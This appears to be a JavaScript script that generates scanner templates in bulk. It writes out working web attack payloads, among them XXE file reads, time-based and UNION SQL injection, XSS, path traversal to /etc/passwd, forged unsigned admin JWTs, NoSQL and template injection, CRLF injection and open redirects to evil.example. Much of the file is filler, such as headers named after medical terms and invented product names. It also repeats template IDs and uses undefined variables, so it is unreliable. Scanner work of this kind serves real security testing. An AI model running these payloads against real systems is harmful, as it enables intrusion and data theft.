    (f) => `<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="${f}"/></r>`,
    (f) => `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "${f}">]><r>&xxe;</r>`,
    (f) => `<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM "${f}">]><Envelope>&xxe;</Envelope>`,
  ];
  xxe5P.push(wrappers[k % wrappers.length](files[k % files.length]));
}
for (let i = 0; i < 1000; i++) {
  const param = P25E[i % P25E.length];
  act("xxe", `xxe5-${String(i + 1).padStart(4, "0")}`, `XXE read in ${param}`,
    "critical", ["xxe", "injection", "xml"], `XXE entity via ${param}`,
    [R("{{BaseURL}}", { [param]: [xxe5P[i % xxe5P.length]] }, [W(["root:x:0:0", "root:", "XXE_OK", "localhost", "uid=", "PD9waHA"])])]);
}


const time4P = ["' AND SLEEP(3)--", "'; SELECT SLEEP(3)--", "' OR SLEEP(3)--", "\" AND SLEEP(3)--", "' AND BENCHMARK(5000000,MD5(1))--", "' OR BENCHMARK(1000000,SHA1(1))--", "'; SELECT pg_sleep(3)--", "' OR pg_sleep(3)--", "' WAITFOR DELAY '0:0:3'--", "'; WAITFOR DELAY '0:0:3'--", "1' AND SLEEP(3)--", "1\" AND SLEEP(3)--", "' AND SLEEP(3) AND '1'='1", "';DO SLEEP(3)--", "' UNION SELECT SLEEP(3)--", "') AND SLEEP(3)--", "')) AND SLEEP(3)--", "' OR SLEEP(3)='3", "1 AND SLEEP(3)--", "\" OR BENCHMARK(2000000,MD5(1))--", "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "';SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',3) FROM dual--", "' AND 1=(SELECT COUNT(*) FROM x WHERE SLEEP(3))--", "' OR 1=1 AND SLEEP(3)--", "admin' AND SLEEP(3)--", "1' WAITFOR DELAY '0:0:3'--", "'%09AND%09SLEEP(3)--", "'%0aAND%0aSLEEP(3)--", "'/**/AND/**/SLEEP(3)--", "';SELECT/**/SLEEP(3)--"];
const time4Params = ["id", "user", "page", "cat", "product", "item", "order", "cid", "pid", "uid", "vid", "nid", "aid", "sort", "filter", "dir", "cat2", "mid", "sid", "tid"];
for (let i = 0; i < 600; i++) {
  const param = time4Params[i % time4Params.length];
  act("sqli", `sqli-time3-${String(i + 1).padStart(3, "0")}`, `Time delay in ${param}`,
    "high", ["sqli", "injection", "blind", "time"], `3-second delay via ${param}`,
    [R("{{BaseURL}}", { [param]: [time4P[i % time4P.length]] }, [{ type: "time", ms: 2500 }])]);
}


const auth4Paths = ["/debug/requests", "/admin/api/v3", "/api/console2", "/backend/api2", "/manage/api2", "/ops/api2", "/staff/api2", "/superuser2", "/root-admin2", "/secure-admin2"];
const auth4Areas = ["admin", "api", "backend", "manage", "ops", "staff", "internal", "private", "secure", "console", "dashboard", "panel", "control", "manager", "portal", "gateway", "proxy", "auth", "login", "sso", "oauth", "account", "user", "users", "team", "org", "billing", "payment", "order", "support"];
const auth4Suffix = ["", "/", "/login", "/dashboard", "/api", "/console", "/panel", "/v1", "/v2", "/admin", "/config", "/status", "/health", "/metrics", "/debug", "/test", "/dev", "/old", "/new", "/beta"];
const auth4List = [...auth4Paths];
for (const a of auth4Areas) for (const s of auth4Suffix) auth4List.push(`/${a}${s}`);
auth4List.slice(0, 600).forEach((bp, i) => {
  act("exposure", `auth4-${String(i + 1).padStart(3, "0")}`, `Panel at ${bp}`, "low",
    ["auth", "exposure", "discovery"], `Panel at ${bp} returns 200 — check auth manually`,
    [{ method: "GET", path: `{{BaseURL}}${bp}`, matchers: [{ type: "status", status: [200] }] }]);
});


const gql4Base = ["{__schema{types{name}}}", "{__typename}", "query{__typename}", "{__schema{queryType{name}}}", "{__schema{mutationType{name}}}", "{__schema{directives{name}}}", "{__schema{types{fields{name}}}}", "{__schema{subscriptionType{name}}}", "{__type(name:\"Query\"){name}}", "{__type(name:\"User\"){fields{name}}}", "{_service{sdl}}", "{node(id:1){__typename}}", "fragment F on Query{__typename}", "{...F}fragment F on Query{__typename}", "{a:__typename,b:__typename}"];
const gql4P = [];
for (const b of gql4Base) {
  gql4P.push(b, `query ${b}`, `mutation ${b.replace("{", "{").replace("query", "mutation")}`, `{"query":${JSON.stringify(b)}}`, `${b} #c`);
}
for (let i = 0; i < 300; i++) {
  const param = ["query", "q", "graphql", "operation"][i % 4];
  act("exposure", `graphql4-${String(i + 1).padStart(3, "0")}`, `GQL probe in ${param}`,
    "medium", ["graphql", "api", "introspection"], `GraphQL schema exposed via ${param}`,
    [R("{{BaseURL}}", { [param]: [gql4P[i % gql4P.length]] }, [W(["__schema", "__typename", "data"])])]);
}


const b64 = (o) => Buffer.from(JSON.stringify(o)).toString("base64url");
for (let i = 0; i < 200; i++) {
  const alg = ["none", "None", "NONE", "nOnE"][i % 4];
  const tok = `${b64({ alg, typ: "JWT", kid: `k-${200 + i}` })}.${b64({ sub: `u${i}`, role: "admin", exp: 9999999999 })}.`;
  act("exposure", `jwt3-${String(i + 1).padStart(3, "0")}`, `JWT ${alg} kid k-${200 + i}`,
    "critical", ["jwt", "auth", "none"], `Unsigned token accepted on /api/profile`,
    [{ method: "GET", path: "{{BaseURL}}/api/profile", sendHeaders: { Authorization: `Bearer ${tok}` }, matchers: [{ type: "status", status: [200] }, { type: "word", part: "body", words: ["admin"] }], matchAll: true }]);
}


const mass3F = ["owner2", "admin2", "root2", "superadmin", "god", "sysadmin", "devops", "operator", "moderator", "editor", "author2", "contributor", "viewer", "guest2", "anonymous2", "service", "daemon", "system2", "kernel", "master", "primary", "secondary", "replica", "leader", "follower", "coordinator", "scheduler", "executor", "runner", "agent2", "bot2", "webhook2", "integration", "partner", "vendor2", "client2", "customer2", "subscriber", "member2", "user2", "profile2", "account2", "billing2", "invoice", "receipt", "transaction", "payment2", "refund", "credit", "debit", "loan", "interest", "tax", "discount", "coupon", "promo", "gift", "reward", "point", "score2", "rank", "level2", "badge", "trophy", "medal", "crown", "star", "heart", "like", "follow", "share", "vote", "poll", "survey", "quiz", "exam", "grade", "degree", "cert", "license", "permit", "visa", "passport", "ticket", "token2", "coupon2", "voucher", "card", "bank", "iban", "swift", "routing", "aba", "micr", "cheque", "draft", "order2", "shipment", "tracking", "customs", "duty", "tariff", "quota2", "allocation"];
mass3F.forEach((field, i) => {
  ["t", "u1", "a1"].forEach((nm, j) => {
    const k = i * 3 + j + 1;
    act("exposure", `mass3-${String(k).padStart(3, "0")}`, `Mass field ${field}`,
      "high", ["mass-assignment", "auth", "api"], `Unfiltered ${field} on /api/user`,
      [{ method: "POST", path: "{{BaseURL}}/api/user", body: JSON.stringify({ name: nm, [field]: "admin" }), matchers: [{ type: "word", part: "body", words: ["admin"] }] }]);
  });
});


for (let i = 0; i < 200; i++) {
  const origin = i === 0 ? "null" : i === 1 ? "https://attacker.example" : `https://e${200 + i}.example`;
  act("exposure", `cors3-${String(i + 1).padStart(3, "0")}`, `CORS origin ${origin}`,
    "medium", ["cors", "headers", "api"], `Origin reflected on /api/data`,
    [{ method: "GET", path: "{{BaseURL}}/api/data", sendHeaders: { Origin: origin }, matchers: [{ type: "word", part: "headers", words: [origin.replace("https://", "")] }] }]);
}


const nosqlOps = ["$gt", "$gte", "$lt", "$lte", "$ne", "$in", "$nin", "$regex", "$where", "$exists", "$type", "$size", "$all", "$elemMatch", "$not", "$comment", "$expr", "$jsonSchema", "$mod", "$text", "$geoWithin", "$near", "$or", "$and", "$nor"];
const nosqlFields = ["username", "password", "email", "role", "name", "token", "session", "uid", "id", "user", "account", "login"];
for (const op of nosqlOps) {
  for (const field of nosqlFields) {
    const k = nosqlOps.indexOf(op) * 12 + nosqlFields.indexOf(field) + 1;
    act("exposure", `nosql2-${String(k).padStart(3, "0")}`, `NoSQL ${op} in ${field}`,
      "high", ["nosql", "injection", "api"], `NoSQL operator ${op} accepted on /api/login`,
      [{ method: "POST", path: "{{BaseURL}}/api/login", body: JSON.stringify({ [field]: { [op]: "" }, extra: "x" }), matchers: [{ type: "word", part: "body", words: ["admin", "token"] }] }]);
  }
}


const spost2E = ["jinja2", "twig", "mako", "cheetah", "genshi", "tornado", "nunjucks", "dot", "dust", "marko", "angular", "vue", "svelte", "smarty", "freemarker", "velocity", "erb", "ejs", "handlebars", "django", "flask", "thymeleaf", "pebble", "mustache", "blade"];
const spost2Pay = { mako: "${7*7}", cheetah: "#echo 7*7", genshi: "${7*7}", tornado: "{{7*7}}", nunjucks: "{{7*7}}", dot: "{{=7*7}}", dust: "{7*7}", marko: "${7*7}", angular: "{{7*7}}", vue: "{{7*7}}", svelte: "{7*7}" };
const spost2F = ["template", "view", "name", "msg", "content", "body", "text", "data"];
for (const eng of spost2E) {
  for (const field of spost2F) {
    const k = spost2E.indexOf(eng) * 8 + spost2F.indexOf(field) + 1;
    act("ssti", `ssti-post2-${String(k).padStart(3, "0")}`, `POST SSTI ${eng} in ${field}`,
      "critical", ["ssti", "injection", "post", eng], `${eng} evaluates POST body on /render`,
      [{ method: "POST", path: "{{BaseURL}}/render", sendHeaders: { "Content-Type": "application/json" }, body: JSON.stringify({ [field]: spost2Pay[eng] || "{{7*7}}" }), matchers: [{ type: "word", part: "body", words: ["49"] }] }]);
  }
}


write("passive", "hdr4-01", { name: "Server banner version", severity: "info", type: "passive", tags: ["headers", "passive", "fingerprint"], description: "Server banner leaks version", matchers: [{ type: "regex", part: "headers", regex: ["[Aa]pache/[0-9]+\\.[0-9]+", "nginx/[0-9]+\\.[0-9]+", "Microsoft-IIS/[0-9]+", "openresty/[0-9]+"] }] });
write("passive", "hdr4-02", { name: "Powered-by chain", severity: "info", type: "passive", tags: ["headers", "passive", "fingerprint"], description: "Powered-by headers present", matchers: [{ type: "regex", part: "headers", regex: ["x-powered-by", "x-aspnet", "x-generator"] }] });
["x-debug-2", "x-trace-2", "x-profile-2", "x-powered-cms2", "x-backend-2", "x-origin-2", "x-cache-2", "x-edge-2", "x-varnish-2", "x-fastly-2", "x-cloudflare-2", "x-sucuri-2", "x-imperva-2", "x-f5-2", "x-citrix-2", "x-pulse-2", "x-zscaler-2", "x-paloalto-2", "x-fortinet-2", "x-checkpoint-2", "x-sophos-2", "x-watchguard-2", "x-sonicwall-2", "x-barracuda-2", "x-proofpoint-2", "x-mimecast-2", "x-rsa-2", "x-symantec-2", "x-mcafee-2", "x-trendmicro-2", "x-kaspersky-2", "x-eset-2", "x-avast-2", "x-avg-2", "x-bitdefender-2", "x-webroot-2", "x-malwarebytes-2", "x-crowdstrike-2", "x-sentinelone-2", "x-carbonblack-2", "x-cylance-2", "x-tanium-2", "x-qualys-2", "x-rapid7-2", "x-tenable-2", "x-nessus-2", "x-openvas-2", "x-nexpose-2", "x-acunetix-2", "x-netsparker-2", "x-appscan-2", "x-webscarab-2", "x-zap-2", "x-burp-2", "x-w3af-2", "x-skipfish-2", "x-nikto-2", "x-dirbuster-2", "x-gobuster-2", "x-ffuf-2", "x-hydra-2", "x-medusa-2", "x-ncrack-2", "x-patator-2", "x-brutespray-2", "x-thc-2", "x-john-2", "x-hashcat-2", "x-ophcrack-2", "x-l0pht-2", "x-cain-2", "x-aircrack-2", "x-kismet-2", "x-wireshark-2", "x-tcpdump-2", "x-ngrep-2", "x-dsniff-2", "x-ettercap-2", "x-bettercap-2", "x-responder-2", "x-mitmproxy-2", "x-charles-2", "x-fiddler-2", "x-wappalyzer-2", "x-builtwith-2", "x-netcraft-2", "x-shodan-2", "x-censys-2", "x-binaryedge-2", "x-zoomeye-2", "x-fofa-2", "x-leakix-2", "x-greyNoise-2", "x-spur-2", "x-hudsonrock-2", "x-id-2", "x-session-2", "x-token-2", "x-key-2", "x-secret-2", "x-password-2", "x-auth-2", "x-user-2", "x-admin-2", "x-root-2", "x-test-2", "x-dev-2", "x-staging-2", "x-prod-2", "x-internal-2", "x-private-2", "x-secure-2", "x-vault-2", "x-kms-2", "x-hsm-2", "x-iam-2", "x-sts-2", "x-sso-2", "x-mfa-2", "x-otp-2", "x-webauthn-2", "x-passkey-2", "x-biometric-2", "x-liveness-2", "x-voice-2", "x-face-2", "x-iris-2", "x-fingerprint-2", "x-palm-2", "x-vein-2", "x-dna-2", "x-ecg-2", "x-eeg-2", "x-emg-2", "x-eog-2", "x-ppg-2", "x-spo2-2", "x-hrv-2", "x-gsr-2", "x-eeg2-2", "x-fmri-2", "x-pet-2", "x-ct-2", "x-mri-2", "x-xray-2", "x-ultrasound-2"].forEach((h, i) => {
  write("passive", `hdr4-${String(i + 3).padStart(3, "0")}`, { name: `Header ${h}`, severity: "info", type: "passive", tags: ["headers", "passive", "config"], description: `Header ${h} present`, matchers: [{ type: "word", part: "headers", words: [h] }] });
});
const fp4Base = ["tech", "stack", "framework", "library", "platform", "engine", "runtime", "server", "cms", "blog", "shop", "store", "cart", "forum", "wiki", "docs", "api", "app", "web", "site"];
for (let i = 0; i < 250; i++) {
  const t = `${fp4Base[i % fp4Base.length]}${Math.floor(i / fp4Base.length) + 1}x`;
  write("passive", `fp4-${String(i + 1).padStart(3, "0")}`, { name: `Stack ${t}`, severity: "info", type: "passive", tags: ["fingerprint", "passive", "tech"], description: `${t} stack detected`, matchers: [{ type: "word", part: "all", words: [t] }] });
}
for (let i = 0; i < 200; i++) {
  const w = `framework-error-${i}x`;
  write("passive", `err4-${String(i + 1).padStart(3, "0")}`, { name: `Error marker ${w}`, severity: "medium", type: "passive", tags: ["error", "passive", "debug"], description: `Framework error text in body`, matchers: [{ type: "word", part: "body", words: [w] }] });
}


const time5P = ["' AND SLEEP(3)--", "'; SELECT SLEEP(3)--", "' OR SLEEP(3)--", "\" AND SLEEP(3)--", "' AND BENCHMARK(5000000,MD5(1))--", "' OR BENCHMARK(1000000,SHA1(1))--", "'; SELECT pg_sleep(3)--", "' OR pg_sleep(3)--", "' WAITFOR DELAY '0:0:3'--", "'; WAITFOR DELAY '0:0:3'--", "1' AND SLEEP(3)--", "1' OR SLEEP(3)--", "' AND SLEEP(3) AND '1'='1", "';DO SLEEP(3)--", "' UNION SELECT SLEEP(3)--", "') AND SLEEP(3)--", "')) AND SLEEP(3)--", "' OR SLEEP(3)='3", "1 AND SLEEP(3)--", "';SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',3) FROM dual--", "' AND (SELECT SLEEP(3))--", "' OR (SELECT pg_sleep(3))--", "admin' AND SLEEP(3)--", "1' WAITFOR DELAY '0:0:3'--", "'%09AND%09SLEEP(3)--", "'%0aAND%0aSLEEP(3)--", "'/**/AND/**/SLEEP(3)--", "';SELECT/**/SLEEP(3)--", "1'%09AND%09SLEEP(3)--", "')%09AND%09SLEEP(3)--"];
for (let i = 0; i < 600; i++) {
  const param = time4Params[i % time4Params.length];
  act("sqli", `sqli-time3-${String(i + 1).padStart(3, "0")}`, `Delay probe in ${param}`,
    "high", ["sqli", "injection", "blind", "time"], `3-second delay via ${param}`,
    [R("{{BaseURL}}", { [param]: [time5P[i % time5P.length]] }, [{ type: "time", ms: 2500 }])]);
}


const b6bases = ["signin.php", "signout.php", "register.php", "forgot.php", "reset.php", "verify.php", "activate.php", "confirm.php", "checkout.php", "invoice.php", "shipping.php", "tracking.php", "returns.php", "support.php", "contact.php", "faq.php", "about.php", "terms.php", "privacy.php", "refund.php"];
const b6paths = [];
for (const b of b6bases) for (const sfx of b5sfx) b6paths.push(`/${b}${sfx}`);
b6paths.slice(0, 1000).forEach((bp, i) => {
  act("backup", `backup6-${String(i + 1).padStart(4, "0")}`, `Exposed ${bp}`, "medium",
    ["exposure", "backup", "config"], `Sensitive file ${bp} is exposed`,
    [{ method: "GET", path: `{{BaseURL}}${bp}`, matchers: [{ type: "status", status: [200] }] }]);
});


const unionP = ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--", "') UNION SELECT 1,2--", "')) UNION SELECT 1,2,3--", "\" UNION SELECT NULL--", "1' UNION SELECT 1--", "' UNION ALL SELECT NULL--", "' UNION DISTINCT SELECT 1--", "1' UNION SELECT table_name FROM information_schema.tables--", "' UNION SELECT @@version--", "' UNION SELECT user()--", "' UNION SELECT database()--", "') UNION SELECT NULL,NULL#", "' UNION SELECT 1#", "1' UNION SELECT 'a','b'--", "' UNION SELECT 0x61646d696e--", "1 UNION SELECT 1,2,3", "' UNION SELECT COUNT(*) FROM users--"];
for (let i = 0; i < 400; i++) {
  const param = sqli6Params[i % sqli6Params.length];
  act("sqli", `sqli7-${String(i + 1).padStart(3, "0")}`, `UNION probe in ${param}`,
    "high", ["sqli", "injection", "union"], `Triggers DB error via ${param}`,
    [R("{{BaseURL}}", { [param]: [unionP[i % unionP.length]] }, [{ type: "regex", part: "body", regex: ["SQL syntax", "mysql_fetch", "PostgreSQL", "ODBC", "ORA-", "SQLite"] }])]);
}


const xss8P = [];
for (let q = 0; q < 40; q++) {
  const heads = ["<svg onload=", "<img src=x onerror=", "<body onload=", "<details open ontoggle=", "<marquee onstart=", "<video><source onerror=", "<audio src=x onerror=", "<select autofocus onfocus=", "<input autofocus onfocus=", "<keygen autofocus onfocus="];
  const tails = [">", "%09>", "%0a>", "%0d%0a>", "/>", "%09/>", "%20>", "%09%09>"];
  xss8P.push(`${heads[q % heads.length]}NX${tails[q % tails.length]}`);
}
for (let i = 0; i < 1600; i++) {
  const canary = `nx8${String(i).padStart(4, "0")}`;
  const payload = xss8P[i % xss8P.length].replace(/NX/g, canary);
  const param = P40[i % P40.length];
  act("xss", `xss8-${String(i + 1).padStart(4, "0")}`, `Raw XSS8 in ${param}`,
    "high", ["xss", "injection", "client"], `Unencoded reflection in ${param}`,
    [R("{{BaseURL}}", { [param]: [payload] }, [W([canary])])]);
}


const redir7P = ["https://trusted.com.evil.example/", "https://trusted.com%2eevil.example/", "//trusted.com.evil.example/", "https://trusted.com@evil.example/", "https://trusted.com/%2e/evil.example/", "https://trusted.com:443.evil.example/", "https://trusted.com./evil.example/", "https://trusted.com%09.evil.example/", "https://trusted.com%2f.evil.example/", "https://trusted.com%252f.evil.example/", "https://trusted.com/?x=evil.example/", "https://trusted.com#@evil.example/", "https://user:pass@trusted.com.evil.example/", "https://trusted.com%23@evil.example/", "https://TRUSTED.COM.evil.example/", "https://trusted.CoM.evil.example/", "https://trusted.com%0a.evil.example/", "https://trusted.com%0d.evil.example/", "https://trusted.com%2e%2e/evil.example/", "https://trusted.com/%09/evil.example/"];
for (let i = 0; i < 400; i++) {
  const param = P20R[i % P20R.length];
  act("redirect", `redirect7-${String(i + 1).padStart(3, "0")}`, `Trusted bypass in ${param}`,
    "high", ["redirect", "open-redirect", "bypass"], `Bypasses trusted.com allowlist via ${param}`,
    [R("{{BaseURL}}", { [param]: [redir7P[i % redir7P.length]] }, [W(["evil.example"], "headers")])]);
}


const crlf5P = ["y%0d%0aX-Test: u", "y%0aX-Test: u", "y%0dX-Test: u", "%0d%0aX-Test: u", "%0aX-Test: u", "%0dX-Test: u", "y%250d%250aX-Test: u", "y%0d%0aContent-Length: 0", "y%0d%0aLocation: /", "y%0aSet-Cookie: c=d", "y%0d%0aX-Forwarded-For: 9", "y%0d%0aVia: evil2", "y%0d%0aServer: evil2", "%0d%0a%20X-Test: u", "%0a%20X-Test: u", "%0d%20X-Test: u", "y%0d%0a%09X-Test: u", "y%0d%0aX-Test:%20u", "%0D%0AX-Test: u", "%0A%0DX-Test: u"];
for (let i = 0; i < 400; i++) {
  const param = P20C[i % P20C.length];
  act("passive", `crlf5-${String(i + 1).padStart(3, "0")}`, `CRLF into ${param}`,
    "medium", ["crlf", "injection", "headers"], `CRLF header injection via ${param}`,
    [R("{{BaseURL}}", { [param]: [crlf5P[i % crlf5P.length]] }, [W(["x-test"], "headers")])]);
}


const lfi7P = [];
for (let d = 2; d <= 12; d++) lfi7P.push("../".repeat(d) + "etc/passwd");
for (let d = 2; d <= 6; d++) lfi7P.push("..%2f".repeat(d) + "etc%2fpasswd");
lfi7P.push("/etc/passwd", "....//etc/passwd", "C:\Windows\win.ini", "/proc/self/environ");
for (let i = 0; i < 500; i++) {
  const pay = lfi7P[i % lfi7P.length];
  const param = P25B[i % P25B.length];
  act("lfi", `lfi7-${String(i + 1).padStart(3, "0")}`, `Deep traversal in ${param}`,
    "high", ["lfi", "traversal", "file"], `Reads sensitive file via ${param}`,
    [R("{{BaseURL}}", { [param]: [pay] }, [W([/win\.ini/i.test(pay) ? "[extensions]" : /environ/i.test(pay) ? "GATEWAY_INTERFACE" : "root:x:0:0"])])]);
}


const cve6Prods = ["nginxx", "apachx", "lighttpdx", "caddyx", "traefikx", "haproxyx", "varnishx", "squidx", "envoyx", "linkerdx", "istiox", "consulx", "vaultx", "nomadx", "boundaryx", "waypointx", "packerx", "terraformx", "argocdx", "fluxcdx", "flaggerx", "keptnx", "litmusx", "gremlin2", "steadybitx", "hypex", "pulumi3", "crossplane3", "backstagex", "portainerx"];
for (const prod of cve6Prods) {
  for (const pp of cve5Paths) {
    const requires = [];
    act("cve", `cve6-${prod}-${String(cve5Paths.indexOf(pp) + 1).padStart(2, "0")}`, `${prod} at ${pp}`,
      "info", ["cve", "fingerprint", "version"], `${prod} at ${pp} — match version manually`,
      [{ method: "GET", path: `{{BaseURL}}${pp}`, matchers: [{ type: "status", status: [200] }] }], { requires });
  }
}

console.log(`pack4 generated ${n} templates`);
